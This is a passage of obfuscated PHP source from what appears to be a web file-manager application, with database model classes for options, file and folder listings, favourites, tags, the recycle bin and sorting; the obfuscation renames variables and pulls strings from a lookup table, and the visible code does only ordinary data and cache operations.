Model($this->modelType)->set($Æ÷ş²Ë¦, !1, $this->optionType); return $ÃÇ›ó…Æ; } public function update($‡ŠÆ÷Ë, $ÓÊ§Êˆ¨) { $ïğ”âÊ =& $_SERVER[‰‰Ş‚€]; $ÓÊ§Êˆ¨ = array_field_key($ÓÊ§Êˆ¨, $this->field); $Ó«¾ÉÂê = $this->listData($‡ŠÆ÷Ë); if (!$Ó«¾ÉÂê || !$‡ŠÆ÷Ë) { return !1; } $ÓÊ§Êˆ¨ = array_merge($Ó«¾ÉÂê, $ÓÊ§Êˆ¨); $ÓÊ§Êˆ¨[$ïğ”âÊ[98]] = time(); return Model($this->modelType)->set($ïğ”âÊ[492] . $‡ŠÆ÷Ë, $ÓÊ§Êˆ¨, $this->optionType); } public function remove($ÒÍ•»…) { if (!$ÒÍ•»…) { return !1; } return Model($this->modelType)->remove($_SERVER[‰‰Ş‚€][492] . $ÒÍ•»…, $this->optionType); } public function removeArr($òÏ²ı Ç) { if (!$òÏ²ı Ç) { return !0; } $Íİ‰«¡± = array(); foreach ($òÏ²ı Ç as $ôíåÍ–”) { $Íİ‰«¡±[] = $_SERVER[‰‰Ş‚€][492] . $ôíåÍ–”; } return Model($this->modelType)->removeArr($Íİ‰«¡±, $this->optionType); } public function clear() { $Æ¬è˜éÅ =& $_SERVER[‰‰Ş‚€]; Model($this->modelType)->remove($Æ¬è˜éÅ[493], $this->optionType . $Æ¬è˜éÅ[494]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ßÁ»”à, $é½Äß†Ö) { if (!$é½Äß†Ö) { return !1; } $ğùÇŒ¦° = $this->listData(); $ğùÇŒ¦° = array_to_keyvalue($ğùÇŒ¦°, $ßÁ»”à); return isset($ğùÇŒ¦°[$é½Äß†Ö]) ? $ğùÇŒ¦°[$é½Äß†Ö] : !1; } public function findByName($ŞÈ¢¨¿Ê) { return $this->findByKey($_SERVER[‰‰Ş‚€][42], $ŞÈ¢¨¿Ê); } protected function resetData($¡â˜È¡ï) { $ö²âæÀ„ =& $_SERVER[‰‰Ş‚€]; if (!$¡â˜È¡ï) { return; } $¡â˜È¡ï = is_array($¡â˜È¡ï) ? $¡â˜È¡ï : array(); $€‚• ”Ü = array(); for ($øØ¹ˆª = 0; $øØ¹ˆª < count($¡â˜È¡ï); $øØ¹ˆª++) { if (!$¡â˜È¡ï[$øØ¹ˆª] || !$¡â˜È¡ï[$øØ¹ˆª][$ö²âæÀ„[491]]) { continue; } $€‚• ”Ü[$ö²âæÀ„[492] . $¡â˜È¡ï[$øØ¹ˆª][$ö²âæÀ„[491]]] = $¡â˜È¡ï[$øØ¹ˆª]; } return Model($this->modelType)->set($€‚• ”Ü, !1, $this->optionType); } private function getAutoName($ÑÄ­µà) { $èŠŒÛ¼¤ = array_to_keyvalue($this->listData(), $_SERVER[‰‰Ş‚€][42]); if (!$èŠŒÛ¼¤ || !isset($èŠŒÛ¼¤[$ÑÄ­µà])) { return $ÑÄ­µà; } for ($å½ƒ¡°Í = 1; $å½ƒ¡°Í < count($èŠŒÛ¼¤); $å½ƒ¡°Í++) { $Ì´Ş›²¨ = $ÑÄ­µà . "\50{$å½ƒ¡°Í}\51"; if (!isset($èŠŒÛ¼¤[$Ì´Ş›²¨])) { return $Ì´Ş›²¨; } } return $Ì´Ş›²¨; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ŒÙŸú¾ö = false, $£ÏáÑ€Ò = '', $ñ»Ü× = false, $²‘Ş¸éè = true) { $¤Î™ĞÅµ =& $_SERVER[‰‰Ş‚€]; $ÃÊÄ„Ş¥ = $this->cacheGet($£ÏáÑ€Ò); $Ë×¶ûë = $this->optionDefault($£ÏáÑ€Ò); $Ë×¶ûë = is_array($Ë×¶ûë) ? $Ë×¶ûë : array(); if (is_array($ÃÊÄ„Ş¥)) { if ($²‘Ş¸éè) { $ÃÊÄ„Ş¥ = array_merge($Ë×¶ûë, $ÃÊÄ„Ş¥); } return $ŒÙŸú¾ö ? isset($ÃÊÄ„Ş¥[$ŒÙŸú¾ö]) ? $ÃÊÄ„Ş¥[$ŒÙŸú¾ö] : null : $ÃÊÄ„Ş¥; } $¦¶ø¬Í‚ = $this->filterWhere(array($¤Î™ĞÅµ[43] => $£ÏáÑ€Ò)); $ÃÊÄ„Ş¥ = $this->where($¦¶ø¬Í‚)->select(); $ÃÊÄ„Ş¥ = array_to_keyvalue($ÃÊÄ„Ş¥, $¤Î™ĞÅµ[105], $¤Î™ĞÅµ[459]); foreach ($ÃÊÄ„Ş¥ as $¯ı…¶ˆß => $óÆÓµ) { if ($ñ»Ü× || in_array($¯ı…¶ˆß, $this->jsonField)) { $ÃÊÄ„Ş¥[$¯ı…¶ˆß] = json_decode($óÆÓµ, !0); } } $this->cacheSet($£ÏáÑ€Ò, $ÃÊÄ„Ş¥); if ($²‘Ş¸éè) { $ÃÊÄ„Ş¥ = array_merge($Ë×¶ûë, $ÃÊÄ„Ş¥); } return $ŒÙŸú¾ö ? $ÃÊÄ„Ş¥[$ŒÙŸú¾ö] : $ÃÊÄ„Ş¥; } public function set($ˆô×ñÎ², $şèÌ¶  = false, $¸ëÈÛ§— = '') { $ÉÀ£¢Öò =& $_SERVER[‰‰Ş‚€]; if (!$ˆô×ñÎ²) { return !0; } $´Œ£èÚ‡ = $this->get(!1, $¸ëÈÛ§—, !1, !1); $´Œ£èÚ‡ = is_array($´Œ£èÚ‡) ? $´Œ£èÚ‡ : array(); $¸ïš´˜Ä = array(); $ÇãØ÷™Ï = array(); $ãÚ°Ñ±Æ = array(); $Ûú§¦Î— = is_array($ˆô×ñÎ²) ? $ˆô×ñÎ² : array($ˆô×ñÎ² => $şèÌ¶ ); $ŒšàŒŠ´ = $this->filterWhere(array($ÉÀ£¢Öò[43] => $¸ëÈÛ§—)); foreach ($Ûú§¦Î— as $Á•µ€¥Ä => $ºèËÊ¡) { if (is_array($ºèËÊ¡)) { $ºèËÊ¡ = json_encode_force($ºèËÊ¡); } $this->checkLength($ºèËÊ¡, !1, $this->tableName . $ÉÀ£¢Öò[14] . $ˆô×ñÎ²); $ºèËÊ¡ = self::textEncode($ºèËÊ¡); if (array_key_exists($Á•µ€¥Ä, $´Œ£èÚ‡)) { $ßÉ‘…éÒ = is_array($´Œ£èÚ‡[$Á•µ€¥Ä]) ? json_encode_force($´Œ£èÚ‡[$Á•µ€¥Ä]) : $´Œ£èÚ‡[$Á•µ€¥Ä]; $ßÉ‘…éÒ = self::textEncode($ßÉ‘…éÒ); if ($ßÉ‘…éÒ === $ºèËÊ¡) { continue; } $ÇãØ÷™Ï[] = array($ÉÀ£¢Öò[105], $Á•µ€¥Ä, $ÉÀ£¢Öò[459], $ºèËÊ¡, $ÉÀ£¢Öò[98], time()); } else { $Ù®Üê¬ = array($ÉÀ£¢Öò[43] => $¸ëÈÛ§—, $ÉÀ£¢Öò[105] => $Á•µ€¥Ä, $ÉÀ£¢Öò[459] => $ºèËÊ¡); $¸ïš´˜Ä[] = $this->filterWhere($Ù®Üê¬); } } if (!$¸ïš´˜Ä && !$ÇãØ÷™Ï) { return !0; } $this->cacheRemove($¸ëÈÛ§—); $â´ı¡à = $this->cacheKey($ÉÀ£¢Öò[495]); CacheLock::lock($â´ı¡à); if ($¸ïš´˜Ä) { $this->addAll($¸ïš´˜Ä); } if ($ÇãØ÷™Ï) { $this->saveAll($ÇãØ÷™Ï, $ŒšàŒŠ´); } CacheLock::unlock($â´ı¡à); return !0; } protected function optionDefault($¤¶º£ò = '') { return !1; } public function setDeep($˜ğ“ş¹³, $Ìâ¿Ö‡Ú = false, $ÏåÒ¶øµ = '') { $ã—Š¸İÄ = explode($_SERVER[‰‰Ş‚€][20], $˜ğ“ş¹³); $Îô©ëÑ = $this->get(); array_set_value($Îô©ëÑ, $˜ğ“ş¹³, $Ìâ¿Ö‡Ú); $this->set($ã—Š¸İÄ[0], $Îô©ëÑ[$ã—Š¸İÄ[0]], $ÏåÒ¶øµ); } public function remove($»ÖÙ³®Û, $¹üŞœ— = '') { $éõàÀÉ¥ =& $_SERVER[‰‰Ş‚€]; $this->cacheRemove($¹üŞœ—); $¥µ„€Â¾ = $this->filterWhere(array($éõàÀÉ¥[105] => $»ÖÙ³®Û, $éõàÀÉ¥[43] => $¹üŞœ—)); if (is_null($»ÖÙ³®Û)) { unset($¥µ„€Â¾[$éõàÀÉ¥[105]]); } return $this->where($¥µ„€Â¾)->delete(); } public function removeArr($·²×÷“Ç, $£ÀìĞÂ = '') { $µ©áÎ³¤ =& $_SERVER[‰‰Ş‚€]; if (!$·²×÷“Ç || !is_array($·²×÷“Ç)) { return !0; } $this->cacheRemove($£ÀìĞÂ); $ŞÍšÛƒæ = $this->filterWhere(array($µ©áÎ³¤[43] => $£ÀìĞÂ, $µ©áÎ³¤[105] => array($µ©áÎ³¤[17], $·²×÷“Ç))); return $this->where($ŞÍšÛƒæ)->delete(); } public function cacheSet($â÷«å‰ˆ, $æ×İŒ‹ = false) { return Cache::set($this->cacheKey($â÷«å‰ˆ), $æ×İŒ‹); } public function cacheGet($öÚĞöæ•) { return Cache::get($this->cacheKey($öÚĞöæ•)); } public function cacheRemove($ô‹ªÃ) { return Cache::remove($this->cacheKey($ô‹ªÃ)); } protected function filterWhere($Íæ‰Ø‘¬) { return $Íæ‰Ø‘¬; } protected function cacheKey($¢Ïˆ—Æ) { return $¢Ïˆ—Æ; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\165\x72\x63\145"; protected $tableMeta = array("\x74\141\142\x6c\145\116\x61\x6d\145" => "\x69\x6f\x5f\163\157\x75\x72\143\x65\x5f\x6d\x65\x74\141", "\155\x65\164\x61\106\151\145\154\x64" => "\163\157\165\x72\143\145\x49\x44"); protected $dataAuto = array(array("\x6d\157\x64\151\146\x79\124\x69\x6d\x65", "\164\151\155\145", "\151\x6e\x73\x65\x72\x74", "\146\x75\x6e\143\x74\151\x6f\156"), array("\143\162\145\141\164\145\124\151\x6d\x65", "\x74\151\x6d\145", "\151\156\163\145\x72\164", "\x66\165\156\143\x74\x69\157\x6e"), array("\166\x69\x65\x77\124\151\155\145", "\164\151\x6d\145", "\151\156\x73\x65\x72\164", "\146\x75\156\x63\164\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($·Äì…Ú) { return $this->listSource(array($_SERVER[‰‰Ş‚€][496] => $·Äì…Ú)); } public function typeName($Ê¤ÑÜ¤É) { static $«›á„Ô = array(self::TYPE_SYSTEM => "\163\x79\x73\x74\x65\x6d", self::TYPE_USER => "\165\x73\145\162", self::TYPE_GROUP => "\x67\162\x6f\x75\x70"); return $«›á„Ô[$Ê¤ÑÜ¤É . $_SERVER[‰‰Ş‚€][22]]; } public function sourceListInfo($¥àüíÚ‰, $İßÅŠ±‘ = false) { $ç¦™–Š‡ =& $_SERVER[‰‰Ş‚€]; $¥àüíÚ‰ = $¥àüíÚ‰ ? $¥àüíÚ‰ : array(); $¥àüíÚ‰ = array_filter(array_unique($¥àüíÚ‰)); if (!$¥àüíÚ‰) { return array(); } $Ñ†åßİÙ = $this->where(array($ç¦™–Š‡[202] => array($ç¦™–Š‡[17], $¥àüíÚ‰)))->select(); $this->_listDataApply($Ñ†åßİÙ, $İßÅŠ±‘); return array_to_keyvalue($Ñ†åßİÙ, $ç¦™–Š‡[202]); } public function pathInfoFilter(&$Ìİ‰áÛş) { $Ê¬˜ƒç =& $_SERVER[‰‰Ş‚€]; static $Ôƒ­ê¯ = false; static $Ëæò­ï = false; static $øÈ¶¢ = false; if (!$Ôƒ­ê¯) { $Ñğ¹ìš = $Ê¬˜ƒç[497]; $Ñğ¹ìš .= $Ê¬˜ƒç[498]; $Ñğ¹ìš .= $Ê¬˜ƒç[499]; $¤Å¢äƒ = $Ê¬˜ƒç[500]; $ ÷ïâõ¥ = explode($Ê¬˜ƒç[60], $¤Å¢äƒ); $Ôƒ­ê¯ = explode($Ê¬˜ƒç[60], $Ñğ¹ìš); $Ëæò­ï = array(); foreach ($Ôƒ­ê¯ as $…ŸÈöØÂ) { if (in_array($…ŸÈöØÂ, $ ÷ïâõ¥)) { continue; } $Ëæò­ï[] = $…ŸÈöØÂ; } $øÈ¶¢ = explode($Ê¬˜ƒç[60], $Ê¬˜ƒç[501]); } foreach ($øÈ¶¢ as $°ïË÷¼) { if (isset($Ìİ‰áÛş[$°ïË÷¼])) { $Ìİ‰áÛş[$°ïË÷¼] = intval($Ìİ‰áÛş[$°ïË÷¼]); } } $Ìİ‰áÛş[$Ê¬˜ƒç[97]] = $Ê¬˜ƒç[502] . $Ìİ‰áÛş[$Ê¬˜ƒç[202]] . $Ê¬˜ƒç[503]; $Ìİ‰áÛş[$Ê¬˜ƒç[43]] = $Ìİ‰áÛş[$Ê¬˜ƒç[504]] == 1 ? $Ê¬˜ƒç[88] : $Ê¬˜ƒç[241]; $Ìİ‰áÛş[$Ê¬˜ƒç[199]] = $this->typeName($Ìİ‰áÛş[$Ê¬˜ƒç[199]]); if ($Ìİ‰áÛş[$Ê¬˜ƒç[504]] != 1) { $Ìİ‰áÛş[$Ê¬˜ƒç[177]] = $Ìİ‰áÛş[$Ê¬˜ƒç[505]]; unset($Ìİ‰áÛş[$Ê¬˜ƒç[505]]); } $„†Éƒ›ã = $Ôƒ­ê¯; if (isset($Ìİ‰áÛş[$Ê¬˜ƒç[506]]) && $Ìİ‰áÛş[$Ê¬˜ƒç[506]][$Ê¬˜ƒç[507]] == -1) { $„†Éƒ›ã = $Ëæò­ï; } $Ìİ‰áÛş = array_field_key($Ìİ‰áÛş, $„†Éƒ›ã); return $Ìİ‰áÛş; } public function listUserFav() { $½¦ÎçÊ =& $_SERVER[‰‰Ş‚€]; $¨Ñ”ËÍğ = Model($½¦ÎçÊ[508])->listData(); $ÊÒ™ğŠ = array_filter_by_field($¨Ñ”ËÍğ, $½¦ÎçÊ[43], $½¦ÎçÊ[509]); $ÊÒ™ğŠ = array_to_keyvalue($ÊÒ™ğŠ, $½¦ÎçÊ[22], $½¦ÎçÊ[97]); if ($ÊÒ™ğŠ) { $º¢óƒÑœ = $this->listSource(array($½¦ÎçÊ[510] => array($½¦ÎçÊ[511], $ÊÒ™ğŠ))); } $º¢óƒÑœ = array_to_keyvalue($º¢óƒÑœ[$½¦ÎçÊ[454]], $½¦ÎçÊ[202]); foreach ($¨Ñ”ËÍğ as &$Éøæ™Şí) { $Éøæ™Şí = array($½¦ÎçÊ[512] => $Éøæ™Şí[$½¦ÎçÊ[491]], $½¦ÎçÊ[513] => $Éøæ™Şí[$½¦ÎçÊ[42]], $½¦ÎçÊ[514] => $Éøæ™Şí[$½¦ÎçÊ[97]], $½¦ÎçÊ[515] => $Éøæ™Şí[$½¦ÎçÊ[43]], $½¦ÎçÊ[516] => $Éøæ™Şí[$½¦ÎçÊ[242]], $½¦ÎçÊ[517] => $Éøæ™Şí[$½¦ÎçÊ[98]]); if ($Éøæ™Şí[$½¦ÎçÊ[43]] == $½¦ÎçÊ[509] && $º¢óƒÑœ[$Éøæ™Şí[$½¦ÎçÊ[97]]]) { $Éøæ™Şí[$½¦ÎçÊ[100]] = $º¢óƒÑœ[$Éøæ™Şí[$½¦ÎçÊ[97]]]; } } unset($Éøæ™Şí); return $¨Ñ”ËÍğ; } public function listUserTag($†±ˆŠë) { $¯±¥¬¡É =& $_SERVER[‰‰Ş‚€]; if ($†±ˆŠë && !is_array($†±ˆŠë)) { $†±ˆŠë = array($†±ˆŠë); } $®€€»Ó‘ = Model($¯±¥¬¡É[518])->listData(); $Øúøü† = array(); $Ş—Åõı÷ = array(); foreach ($®€€»Ó‘ as $¥”“ÛÑ×) { $Àïµ­‘° = $¥”“ÛÑ×[$¯±¥¬¡É[97]]; if (!$Àïµ­‘°) { continue; } if (!isset($Ş—Åõı÷[$Àïµ­‘°])) { $Ş—Åõı÷[$Àïµ­‘°] = array(); } $Ş—Åõı÷[$Àïµ­‘°][] = $¥”“ÛÑ×[$¯±¥¬¡É[519]]; $Øúøü†[$¥”“ÛÑ×[$¯±¥¬¡É[97]]] = $¥”“ÛÑ×; } $î¹ãËš = array(); $şª‹öğé = array(); $ûÊë Ş = array(); foreach ($Ş—Åõı÷ as $Æìİ»åÛ => $¨ìÆé©ñ) { $¸†òöÈ° = !0; if (!$†±ˆŠë) { $î¹ãËš[] = $Æìİ»åÛ; continue; } foreach ($†±ˆŠë as $¦°¥èÊ¢) { if (!in_array($¦°¥èÊ¢, $¨ìÆé©ñ)) { $¸†òöÈ° = !1; break; } } if (!$¸†òöÈ°) { continue; } if (!is_numeric($Æìİ»åÛ)) { $ÕãíŠ = $Øúøü†[$Æìİ»åÛ]; $í•ÄÅÚÉ = array($¯±¥¬¡É[42] => $ÕãíŠ[$¯±¥¬¡É[42]], $¯±¥¬¡É[97] => $ÕãíŠ[$¯±¥¬¡É[97]], $¯±¥¬¡É[43] => $ÕãíŠ[$¯±¥¬¡É[43]], $¯±¥¬¡É[100] => array($¯±¥¬¡É[520] => 1), $¯±¥¬¡É[243] => !0); if ($ÕãíŠ[$¯±¥¬¡É[43]] == $¯±¥¬¡É[241]) { $ûÊë Ş[] = $í•ÄÅÚÉ; } if ($ÕãíŠ[$¯±¥¬¡É[43]] == $¯±¥¬¡É[88]) { $şª‹öğé[] = $í•ÄÅÚÉ; } continue; } $î¹ãËš[] = $Æìİ»åÛ; } if ($î¹ãËš) { $İÔå¶îò = $this->listSource(array($¯±¥¬¡É[510] => array($¯±¥¬¡É[511], $î¹ãËš))); } $İÔå¶îò = $İÔå¶îò ? $İÔå¶îò : array($¯±¥¬¡É[95] => array(), $¯±¥¬¡É[96] => array()); $İÔå¶îò[$¯±¥¬¡É[95]] = array_merge($İÔå¶îò[$¯±¥¬¡É[95]], $şª‹öğé); $İÔå¶îò[$¯±¥¬¡É[96]] = array_merge($İÔå¶îò[$¯±¥¬¡É[96]], $ûÊë Ş); if (isset($İÔå¶îò[$¯±¥¬¡É[451]]) && count($î¹ãËš) == $İÔå¶îò[$¯±¥¬¡É[451]][$¯±¥¬¡É[452]]) { return $İÔå¶îò; } $Æé˜ç¦¥ = array(); $”“¬Æ¡ = array_to_keyvalue($İÔå¶îò[$¯±¥¬¡É[95]], $¯±¥¬¡É[22], $¯±¥¬¡É[202]); $·àœ«Åú = array_to_keyvalue($İÔå¶îò[$¯±¥¬¡É[96]], $¯±¥¬¡É[22], $¯±¥¬¡É[202]); $–†×Üµ± = array_merge($·àœ«Åú, $”“¬Æ¡); foreach ($î¹ãËš as $Àïµ­‘°) { if (!in_array($Àïµ­‘°, $–†×Üµ±)) { $Æé˜ç¦¥[] = $Àïµ­‘°; } } if ($Æé˜ç¦¥) { Model($¯±¥¬¡É[521])->removeBySource($Æé˜ç¦¥); } return $İÔå¶îò; } public function listUserRecycle() { $ÀëÂ¿«˜ =& $_SERVER[‰‰Ş‚€]; $ÛÅââ© = Model($ÀëÂ¿«˜[522])->listData(); if (!$ÛÅââ©) { return array(); } $ëïÎ×¢ = array($ÀëÂ¿«˜[510] => array($ÀëÂ¿«˜[511], $ÛÅââ©), $ÀëÂ¿«˜[523] => 1); return $this->listSource($ëïÎ×¢); } public function listSource($¢ÚÃ¥¡, $¾ÅË–š = 3000, $ÄÃÖˆû„ = false) { $¼„„ó‘Ä =& $_SERVER[‰‰Ş‚€]; if (!isset($¢ÚÃ¥¡[$¼„„ó‘Ä[524]])) { $¢ÚÃ¥¡[$¼„„ó‘Ä[524]] = 0; } if (isset($¢ÚÃ¥¡[$¼„„ó‘Ä[201]]) && $¢ÚÃ¥¡[$¼„„ó‘Ä[201]] == $¼„„ó‘Ä[239]) { $¢ÚÃ¥¡[$¼„„ó‘Ä[505]] = array($¼„„ó‘Ä[472], $¼„„ó‘Ä[22]); } if (isset($¢ÚÃ¥¡[$¼„„ó‘Ä[201]])) { $¢ÚÃ¥¡[$¼„„ó‘Ä[201]] = intval($¢ÚÃ¥¡[$¼„„ó‘Ä[201]]); } $ö²Ã¿®ğ = $¼„„ó‘Ä[525]; $Ôşş¾Õ­ = $this->field($ö²Ã¿®ğ)->_makeOrder()->where($¢ÚÃ¥¡)->selectPage($¾ÅË–š); $this->_listPageCheck($Ôşş¾Õ­, $ö²Ã¿®ğ, $¢ÚÃ¥¡); $this->_listDataApply($Ôşş¾Õ­[$¼„„ó‘Ä[454]], $ÄÃÖˆû„); $this->_listMake($Ôşş¾Õ­); return $Ôşş¾Õ­; } private function _listPageCheck(&$ğ±ä“Øí, $ùğ¸œ², $àæ¼·Ò) { $ƒó¨ÏÆ =& $_SERVER[‰‰Ş‚€]; if (!is_array($ğ±ä“Øí[$ƒó¨ÏÆ[451]])) { return; } $…¡õåÁ‚ = $ğ±ä“Øí[$ƒó¨ÏÆ[451]]; if ($…¡õåÁ‚[$ƒó¨ÏÆ[453]] <= 1) { return; } if ($…¡õåÁ‚[$ƒó¨ÏÆ[452]] >= 100000) { return; } if (Model($ƒó¨ÏÆ[526])->get($ƒó¨ÏÆ[527]) != $ƒó¨ÏÆ[528]) { return; } $ùğ¸œ² = str_replace(array($ƒó¨ÏÆ[63], $ƒó¨ÏÆ[426], $ƒó¨ÏÆ[10]), $ƒó¨ÏÆ[22], $ùğ¸œ²); $ùğ¸œ² = $ƒó¨ÏÆ[529] . str_replace($ƒó¨ÏÆ[60], $ƒó¨ÏÆ[530], $ùğ¸œ²) . $ƒó¨ÏÆ[531]; $ú›òµÊ = $ƒó¨ÏÆ[532]; $ú›òµÊ = $ú›òµÊ . $ƒó¨ÏÆ[533]; $°»Ÿîè¨ = $…¡õåÁ‚[$ƒó¨ÏÆ[448]] * ($…¡õåÁ‚[$ƒó¨ÏÆ[437]] - 1) . $ƒó¨ÏÆ[60] . $…¡õåÁ‚[$ƒó¨ÏÆ[448]]; $Ñ·ÆşÍ© = $this->_makeOrder(!0); $™ëíË¦Â = $ƒó¨ÏÆ[529] . str_replace($ƒó¨ÏÆ[60], $ƒó¨ÏÆ[530], $Ñ·ÆşÍ©[0]); if (strpos($™ëíË¦Â, $ƒó¨ÏÆ[534])) { $™ëíË¦Â = str_replace($ƒó¨ÏÆ[534], $ƒó¨ÏÆ[535], $™ëíË¦Â); } else { $™ëíË¦Â .= $ƒó¨ÏÆ[536] . $Ñ·ÆşÍ©[1]; } $¥Ù‚ÒŞÙ = array(); foreach ($àæ¼·Ò as $…ÅÑ¶¬ => $€º„©) { $¥Ù‚ÒŞÙ[$ƒó¨ÏÆ[529] . $…ÅÑ¶¬] = $€º„©; } $this->alias($ƒó¨ÏÆ[537])->field($ùğ¸œ²)->limit($°»Ÿîè¨)->order($™ëíË¦Â); $¤‹Û¥Õğ = $this->join($ú›òµÊ)->where($¥Ù‚ÒŞÙ)->select(); if ($¤‹Û¥Õğ) { $ğ±ä“Øí[$ƒó¨ÏÆ[454]] = $¤‹Û¥Õğ; } } protected function _makeOrder($”®Äìî = false) { $ëóæ™˜è =& $_SERVER[‰‰Ş‚€]; $Ò®Ç¬¤± = Model($ëóæ™˜è[538])->get($ëóæ™˜è[539]); $åœ¤Ûí = Model($ëóæ™˜è[538])->get($ëóæ™˜è[540]); $Úƒ÷åïŸ = array($ëóæ™˜è[541] => $ëóæ™˜è[542], $ëóæ™˜è[543] => $ëóæ™˜è[544]); $½ä»¡«Â = array($ëóæ™˜è[42] => $ëóæ™˜è[42], $ëóæ™˜è[89] => $ëóæ™˜è[89], $ëóæ™˜è[177] => $ëóæ™˜è[505], $ëóæ™˜è[545] => $ëóæ™˜è[545], $ëóæ™˜è[546] => $ëóæ™˜è[547], $ëóæ™˜è[242] => $ëóæ™˜è[242], $ëóæ™˜è[98] => $ëóæ™˜è[98]); $±±ß×ã = Input::get($ëóæ™˜è[548], $ëóæ™˜è[17], $Ò®Ç¬¤±, array_keys($½ä»¡«Â)); $ââÀãóã = Input::get($ëóæ™˜è[549], $ëóæ™˜è[17], $åœ¤Ûí, array_keys($Úƒ÷åïŸ)); if (!in_array($±±ß×ã, array_keys($½ä»¡«Â))) { $±±ß×ã = $ëóæ™˜è[42]; } if (!in_array($ââÀãóã, array_keys($Úƒ÷åïŸ))) { $±±ß×ã = $ëóæ™˜è[541]; } if ($±±ß×ã == $ëóæ™˜è[42]) { } $º×ÕŸÖæ = $ëóæ™˜è[550] . $½ä»¡«Â[$±±ß×ã] . $ëóæ™˜è[63] . $Úƒ÷åïŸ[$ââÀãóã]; $º×ÕŸÖæ = rtrim(trim($º×ÕŸÖæ), $ëóæ™˜è[60]); if ($”®Äìî) { return array($º×ÕŸÖæ, $Úƒ÷åïŸ[$ââÀãóã]); } return $this->order($º×ÕŸÖæ); } protected function _listDataApplyItem($„½åàû£, $ö«Ïöİ— = false) { $äÙÔ¯²ù = array($„½åàû£); $this->_listDataApply($äÙÔ¯²ù, $ö«Ïöİ—); return $äÙÔ¯²ù[0]; } protected function _listDataApply(&$”¿”Úú, $ô°«İàè = false) { $¹µûŸŒ‡ =& $_SERVER[‰‰Ş‚€]; if (!$”¿”Úú) { $”¿”Úú = array(); return; } $Ô‰ŞÍ©é = array_to_keyvalue($”¿”Úú, $¹µûŸŒ‡[22], $¹µûŸŒ‡[202]); $Ô‰ŞÍ©é = array_unique($Ô‰ŞÍ©é); $Ô‰ŞÍ©é = array_to_int($Ô‰ŞÍ©é); $this->_listSourceCache($”¿”Úú); if (!$ô°«İàè) { $this->_listAppendMeta($”¿”Úú, $Ô‰ŞÍ©é); $this->_listAppendFileMeta($”¿”Úú, $Ô‰ŞÍ©é); $this->_listAppendChildren($”¿”Úú, $Ô‰ŞÍ©é); } $this->_listAppendPath($”¿”Úú); $this->_listAppendAuth($”¿”Úú); $this->_listAppendSourceInfo($”¿”Úú, $Ô‰ŞÍ©é); $this->_listAppendUser($”¿”Úú); $this->_listFilterInfo($”¿”Úú, $ô°«İàè); $this->_listAppendAuthSecret($”¿”Úú); } protected function _listSourceCache($—…åïÀò) { $ìêæ„´ =& $_SERVER[‰‰Ş‚€]; foreach ($—…åïÀò as $¨áÍ¡¯µ) { self::$cacheSourceInfo[$ìêæ„´[551] . $¨áÍ¡¯µ[$ìêæ„´[202]]] = $¨áÍ¡¯µ; } } protected function _listFilterInfo(&$…Ô—ÍÊ€, $ƒÕ†²µÛ = false) { $¼Í³¯¹¹ =& $_SERVER[‰‰Ş‚€]; foreach ($…Ô—ÍÊ€ as &$ë»¼­¼ß) { $ë»¼­¼ß = $this->pathInfoFilter($ë»¼­¼ß); self::$cachePathInfo[$¼Í³¯¹¹[552] . intval($ƒÕ†²µÛ) . $¼Í³¯¹¹[481] . $ë»¼­¼ß[$¼Í³¯¹¹[202]]] = $ë»¼­¼ß; } unset($ë»¼­¼ß); } protected function _listMake(&$“ŠøÏìÇ) { $ğ÷Íò³ =& $_SERVER[‰‰Ş‚€]; $“ŠøÏìÇ[$ğ÷Íò³[95]] = array(); $“ŠøÏìÇ[$ğ÷Íò³[96]] = array(); foreach ($“ŠøÏìÇ[$ğ÷Íò³[454]] as $Ö€Áı) { $Ã¾×ı«÷ = $Ö€Áı[$ğ÷Íò³[504]] == 1 ? $ğ÷Íò³[95] : $ğ÷Íò³[96]; $“ŠøÏìÇ[$Ã¾×ı«÷][] = $Ö€Áı; } unset($“ŠøÏìÇ[$ğ÷Íò³[454]]); } protected function _listAppendMeta(&$í÷Áö», $½³ôúÁ¡) { $ªÚ¤¹± =& $_SERVER[‰‰Ş‚€]; $Ì¸ßÄµ = array($ªÚ¤¹±[510] => array($ªÚ¤¹±[511], $½³ôúÁ¡)); $»ü¶Š£… = Model($ªÚ¤¹±[553])->field($ªÚ¤¹±[554])->where($Ì¸ßÄµ)->select(); if (!$»ü¶Š£…) { return; } $ïáÖÒÊÄ = array($ªÚ¤¹±[555], $ªÚ¤¹±[556], $ªÚ¤¹±[535]); $ıäÀªƒØ = array(); foreach ($»ü¶Š£… as $Ñ‘™€»Ì) { if (!isset($ıäÀªƒØ[$Ñ‘™€»Ì[$ªÚ¤¹±[202]]])) { $ıäÀªƒØ[$Ñ‘™€»Ì[$ªÚ¤¹±[202]]] = array(); } if (in_array($Ñ‘™€»Ì[$ªÚ¤¹±[105]], $ïáÖÒÊÄ)) { continue; } if ($Ñ‘™€»Ì[$ªÚ¤¹±[105]] == $ªÚ¤¹±[557]) { $Ñ‘™€»Ì[$ªÚ¤¹±[459]] = $ªÚ¤¹±[558]; } $ıäÀªƒØ[$Ñ‘™€»Ì[$ªÚ¤¹±[202]]][$Ñ‘™€»Ì[$ªÚ¤¹±[105]]] = $Ñ‘™€»Ì[$ªÚ¤¹±[459]]; } foreach ($í÷Áö» as &$—®õïŠª) { $—®õïŠª[$ªÚ¤¹±[559]] = !1; if (isset($ıäÀªƒØ[$—®õïŠª[$ªÚ¤¹±[202]]])) { $—®õïŠª[$ªÚ¤¹±[559]] = $ıäÀªƒØ[$—®õïŠª[$ªÚ¤¹±[202]]]; } if ($this->fileIsLock($—®õïŠª) && $—®õïŠª[$ªÚ¤¹±[506]]) { $æã› …Å = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $—®õïŠª[$ªÚ¤¹±[506]][$ªÚ¤¹±[507]] = AuthModel::authDisable($—®õïŠª[$ªÚ¤¹±[506]][$ªÚ¤¹±[507]], $æã› …Å); $—®õïŠª[$ªÚ¤¹±[506]][$ªÚ¤¹±[560]][$ªÚ¤¹±[506]] = $—®õïŠª[$ªÚ¤¹±[506]][$ªÚ¤¹±[507]]; } } unset($—®õïŠª); } protected function 